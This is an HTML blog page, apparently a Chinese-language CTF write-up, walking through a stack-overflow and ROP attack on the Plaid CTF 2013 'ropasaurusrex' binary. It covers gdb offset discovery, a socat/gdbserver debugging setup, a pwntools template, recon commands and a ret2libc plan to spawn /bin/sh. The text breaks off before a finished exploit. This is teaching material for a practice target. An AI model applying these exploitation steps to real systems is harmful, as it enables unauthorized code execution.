@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Plaid CTF 2013 - pwn200 – ropasaurusrex | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="CTF,Pwn">
+    <meta name="description" content="Plaid CTF 2013 - pwn200 – ropasaurusrex 根据难度可以分成Level 1 ～ 5 Level 1(原始二进制)会详细讲解 后面的难度自行探索  ropasaurusrex攻略(Level 1)查看x86二进制文件文件可以在这里下载： http:&#x2F;&#x2F;shell-storm.org&#x2F;repo&#x2F;CTF&#x2F;PlaidCTF-2013&#x2F;Pwnable&#x2F;ropasaurus">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Plaid CTF 2013 - pwn200 – ropasaurusrex">
+<meta property="og:url" content="https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="Plaid CTF 2013 - pwn200 – ropasaurusrex 根据难度可以分成Level 1 ～ 5 Level 1(原始二进制)会详细讲解 后面的难度自行探索  ropasaurusrex攻略(Level 1)查看x86二进制文件文件可以在这里下载： http:&#x2F;&#x2F;shell-storm.org&#x2F;repo&#x2F;CTF&#x2F;PlaidCTF-2013&#x2F;Pwnable&#x2F;ropasaurus">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041601.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041602.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041603.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041604.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041605.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041606.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041701.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041702.jpg">
+<meta property="article:published_time" content="2019-04-19T02:44:34.000Z">
+<meta property="article:modified_time" content="2019-04-19T02:45:45.017Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041601.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Plaid CTF 2013 - pwn200 – ropasaurusrex</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Plaid CTF 2013 - pwn200 – ropasaurusrex</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-19T02:44:34.000Z" itemprop="datePublished" class="page-time">
+  2019-04-19
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Plaid-CTF-2013-pwn200-–-ropasaurusrex"><span class="post-toc-number">1.</span> <span class="post-toc-text">Plaid CTF 2013 - pwn200 – ropasaurusrex</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ropasaurusrex攻略-Level-1"><span class="post-toc-number">2.</span> <span class="post-toc-text">ropasaurusrex攻略(Level 1)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查看x86二进制文件"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">查看x86二进制文件</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞测试"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">漏洞测试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#可以看到EIP可以被修改为任意值"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">可以看到EIP可以被修改为任意值</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#动态调试"><span class="post-toc-number">3.</span> <span class="post-toc-text">动态调试</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#编写exploit前需要注意的"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">编写exploit前需要注意的</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#动态调试环境"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">动态调试环境</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#调试"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">调试</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#编写exploit"><span class="post-toc-number">4.</span> <span class="post-toc-text">编写exploit</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">信息收集</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#context-log-level-‘debug’-output-verbose-log"><span class="post-toc-number">5.</span> <span class="post-toc-text">context.log_level &#x3D; ‘debug’  # output verbose log</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#libc-ELF-‘’"><span class="post-toc-number">6.</span> <span class="post-toc-text">libc &#x3D; ELF(‘’)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#preparing-for-exploitation"><span class="post-toc-number">7.</span> <span class="post-toc-text">preparing for exploitation</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#write-STDOUT-got-write-4"><span class="post-toc-number">8.</span> <span class="post-toc-text">write(STDOUT, got_write, 4)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#read-STDIN-data-8"><span class="post-toc-number">9.</span> <span class="post-toc-text">read(STDIN, data, 8)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#read-STDIN-got-write-4"><span class="post-toc-number">10.</span> <span class="post-toc-text">read(STDIN, got_write, 4)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#write-data-system-“-bin-sh”"><span class="post-toc-number">11.</span> <span class="post-toc-text">write(data) # system(“&#x2F;bin&#x2F;sh”)</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Plaid-CTF-2013-pwn200-–-ropasaurusrex"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Plaid CTF 2013 - pwn200 – ropasaurusrex</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-04-19 10:44:34" datetime="2019-04-19T02:44:34.000Z"  itemprop="datePublished">2019-04-19</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Plaid-CTF-2013-pwn200-–-ropasaurusrex"><a href="#Plaid-CTF-2013-pwn200-–-ropasaurusrex" class="headerlink" title="Plaid CTF 2013 - pwn200 – ropasaurusrex"></a>Plaid CTF 2013 - pwn200 – ropasaurusrex</h1><ul>
+<li>根据难度可以分成Level 1 ～ 5</li>
+<li>Level 1(原始二进制)会详细讲解</li>
+<li>后面的难度自行探索</li>
+</ul>
+<h1 id="ropasaurusrex攻略-Level-1"><a href="#ropasaurusrex攻略-Level-1" class="headerlink" title="ropasaurusrex攻略(Level 1)"></a>ropasaurusrex攻略(Level 1)</h1><h2 id="查看x86二进制文件"><a href="#查看x86二进制文件" class="headerlink" title="查看x86二进制文件"></a>查看x86二进制文件</h2><p>文件可以在这里下载：</p>
+<p><a href="http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/" target="_blank" rel="noopener">http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/</a></p>
+<ul>
+<li><p>尝试运行一下，大概像这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;ropasaurusrex       </span><br><span class="line">aaa</span><br><span class="line">WIN</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>只启用了NX</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ropasaurusrex -q</span><br><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>__libc_start_main</code>之前push的值是main()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __libc_start_main(int (*main) (int,char**, char**), </span><br><span class="line">int argc,</span><br><span class="line">char **ubp_av,</span><br><span class="line">void (*init) (void), </span><br><span class="line">void (*fini) (void), </span><br><span class="line">void (*rtld_fini) (void), </span><br><span class="line">void (*stack_end)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>__libc_start_main是glibc(现代Linux标准)中，在调用main()函数之前准备各种东西的包装函数</p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041601.jpg" alt="img"></p>
+</li>
+<li><p>只有两个函数</p>
+<ul>
+<li>大致分析结果</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041602.jpg" alt="img"></p>
+</li>
+<li><p>转换成C语言代码大概是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char **argv, char **envp) &#123; </span><br><span class="line">	do_read();</span><br><span class="line">	return write(STDOUT_FILENO, &quot;WIN\n&quot;, 4);</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">void do_read() &#123;</span><br><span class="line">	char buffer[128]; </span><br><span class="line">	read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>很明显存在stack溢出</p>
+<ul>
+<li>128字节的区域中读入256字节内容</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041603.jpg" alt="img"></p>
+</li>
+<li><p>溢出前后stack的状态大概是这样</p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041604.jpg" alt="img"></p>
+<ul>
+<li>我们使用gdb测试能否直接控制Return Address</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041605.jpg" alt="img"></p>
+</li>
+</ul>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><ul>
+<li><p>如果能够控制EIP就最好了</p>
+<ul>
+<li><p>只需要发送大量的’A’，通过溢出应该能够覆盖返回地址</p>
+</li>
+<li><p>但是，在编写exploit时，需要知道具体溢出在哪个字节位置</p>
+<ul>
+<li>单纯通过AAAA…来修改返回地址的话，并不能再换掉具体多少个字节能够控制EIP</li>
+<li>gcc编译优化可能存在align，导致产生偏移</li>
+<li>IDA的stack frame显示相对准确，但为了以防万一</li>
+</ul>
+</li>
+<li><p>通过gdb的pattern来计算出EIP的偏移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ropasaurusrex -q  </span><br><span class="line">gdb-peda$ pattern_create 256</span><br><span class="line">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;</span><br><span class="line">gdb-peda$ r &lt;&lt;&lt; &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;</span><br><span class="line">Starting program: &#x2F;home&#x2F;parallels&#x2F;Desktop&#x2F;ropasaurusrex-200&#x2F;ropasaurusrex &lt;&lt;&lt; &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">...s</span><br><span class="line">Program received signal SIGSEGV (fault address 0x41416d41)</span><br><span class="line">gdb-peda$ pattern_offset 0x41416d41</span><br><span class="line">1094806849 found at offset: 140</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="可以看到EIP可以被修改为任意值"><a href="#可以看到EIP可以被修改为任意值" class="headerlink" title="可以看到EIP可以被修改为任意值"></a>可以看到EIP可以被修改为任意值</h2><ul>
+<li>也获取到了Return Address的偏移是140<ul>
+<li>140bytes + Return Address + …</li>
+</ul>
+</li>
+<li>存在预期的漏洞，可以利用<ul>
+<li>尝试很重要</li>
+<li>能够控制EIP才能够利用漏洞</li>
+</ul>
+</li>
+<li>之后继续调试编写exploit就可以</li>
+</ul>
+<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><h2 id="编写exploit前需要注意的"><a href="#编写exploit前需要注意的" class="headerlink" title="编写exploit前需要注意的"></a>编写exploit前需要注意的</h2><ul>
+<li>题目环境开启了ASLR(确切的说，大部分CTF都开启了ASLR)</li>
+<li>也就是说，需要使用泄漏地址或者类似技术</li>
+<li>exploit中需要动态计算和发送地址</li>
+<li>对于地址调整，如果不能用gdb动态调试就很麻烦</li>
+</ul>
+<h2 id="动态调试环境"><a href="#动态调试环境" class="headerlink" title="动态调试环境"></a>动态调试环境</h2><p>推荐使用socat结合gdbserver</p>
+<ul>
+<li><p>服务端(终端1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vi main.sh</span><br><span class="line">gdbserver localhost:1234 .&#x2F;ropasaurusrex</span><br><span class="line">$ chmod +x main.sh</span><br><span class="line">$ socat TCP-LISTEN:1025,reuseaddr,fork EXEC:&quot;.&#x2F;main.sh&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用socat进行监听，如果有连接则运行gdbserver</p>
+</li>
+<li><p>攻击端(终端2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &quot;print &#39;A&#39;*140 + &#39;B&#39;*4&quot; | nc localhost 1025</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调试端(终端3)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ vi cmd</span><br><span class="line">file .&#x2F;ropasaurusrex</span><br><span class="line">target remote localhost:1234</span><br><span class="line">c</span><br><span class="line">$ gdb .&#x2F;ropasaurusrex -q -x cmd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用gdb的远程调试功能连接到本机的gdbserver</p>
+</li>
+</ul>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>如果想要查看每一步的状态或者GOT覆盖状态，可以使用gdb设置好断点</p>
+<ul>
+<li>建议设置在0x0804841C附近</li>
+<li>因为它是ROP的开始</li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041606.jpg" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
+<ul>
+<li><p>每次都设置断点很麻烦，可以将其写在cmd文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ vi cmd</span><br><span class="line">file .&#x2F;ropasaurusrex</span><br><span class="line">target remote localhost:1234</span><br><span class="line">b *0x0804841C</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>之后按上节动态调试环境中步骤运行</p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041701.jpg" alt="img"></p>
+<ul>
+<li>停在了ret</li>
+<li>之后将要返回的是”BBBB”(=0x42424242)</li>
+</ul>
+</li>
+<li><p>继续执行一条指令</p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041702.jpg" alt="img"></p>
+<ul>
+<li>EIP = 0x42424242</li>
+</ul>
+</li>
+<li><p>仔细构造数据就能够ret2plt或者GOT overwrite</p>
+</li>
+</ul>
+<h1 id="编写exploit"><a href="#编写exploit" class="headerlink" title="编写exploit"></a>编写exploit</h1><ul>
+<li><p>exploit模板大概是这样(使用pwntools)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;i386&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;  # output verbose log</span><br><span class="line"></span><br><span class="line">RHOST &#x3D; &quot;localhost&quot;</span><br><span class="line">RPORT &#x3D; 8080</span><br><span class="line">LHOST &#x3D; &quot;127.0.0.1&quot;</span><br><span class="line">LPORT &#x3D; 8080</span><br><span class="line"></span><br><span class="line"># libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;babyfirst-heap&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def section_addr(name, elf&#x3D;elf):</span><br><span class="line">    return elf.get_section_by_name(name).header[&#39;sh_addr&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn &#x3D; None</span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    if sys.argv[1] &#x3D;&#x3D; &#39;r&#39;:</span><br><span class="line">        conn &#x3D; remote(RHOST, RPORT)</span><br><span class="line">    elif sys.argv[1] &#x3D;&#x3D; &#39;l&#39;:</span><br><span class="line">        conn &#x3D; remote(LHOST, LPORT)</span><br><span class="line">    elif sys.argv[1] &#x3D;&#x3D; &#39;d&#39;:</span><br><span class="line">        execute &#x3D; &quot;&quot;&quot;</span><br><span class="line">		# set environment LD_PRELOAD&#x3D;</span><br><span class="line">		#b *&#123;0&#125;</span><br><span class="line">		#b *0x8048afa</span><br><span class="line">		ignore 2 0x0a</span><br><span class="line">		c</span><br><span class="line">		&quot;&quot;&quot;.format(hex(elf.symbols[&#39;main&#39;] if &#39;main&#39; in elf.symbols.keys() else elf.entrypoint))</span><br><span class="line">        conn &#x3D; gdb.debug([&#39;.&#x2F;babyfirst-heap&#39;], execute&#x3D;execute)</span><br><span class="line">else:</span><br><span class="line">    conn &#x3D; process([&#39;.&#x2F;babyfirst-heap&#39;])</span><br><span class="line"># conn &#x3D; process([&#39;.&#x2F;heap&#39;], env&#x3D;&#123;&#39;LD_PRELOAD&#39;: &#39;&#39;&#125;)</span><br><span class="line"></span><br><span class="line"># preparing for exploitation</span><br><span class="line"></span><br><span class="line">log.info(&#39;Pwning&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>pwntools使用方法参见官方文档及其他公开资料</p>
+</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
+<li><p>编写exploit之前需要先收集二进制地址等信息</p>
+</li>
+<li><p>可以使用各种命令来收集信息</p>
+</li>
+<li><p>调查各种PLT/GOT</p>
+<p><code>$ objdump -d -M intel ropasaurusrex | grep &quot;@plt&gt;:&quot; -A1</code></p>
+</li>
+<li><p>pop×N gadget 调查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb .&#x2F;ropasaurusrex –q</span><br><span class="line">gdb-peda $ start</span><br><span class="line">gdb-peda $ ropgadget</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>地址固定的RW区域(.data)调查</p>
+<p><code>$ readelf -S ropasaurusrex | fgrep .data</code></p>
+</li>
+<li><p>libc中的system偏移</p>
+</li>
+<li><pre><code>$ ldd ropasaurusrex (首先获取使用的libc路径)
+$ objdump -d /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot; (在对应libc中调查)
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 组合攻击流</span><br><span class="line"></span><br><span class="line">1. 通过write泄漏某处GOT的地址</span><br><span class="line"></span><br><span class="line">   将write(STDOUT, got_write, 4)加载到stack上</span><br><span class="line"></span><br><span class="line">2. 通过泄漏的地址计算出system@libc的地址</span><br></pre></td></tr></table></figure>
+ libc_base = u(f.read(4)) - offset_write libc_system = libc_base + offset_system
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 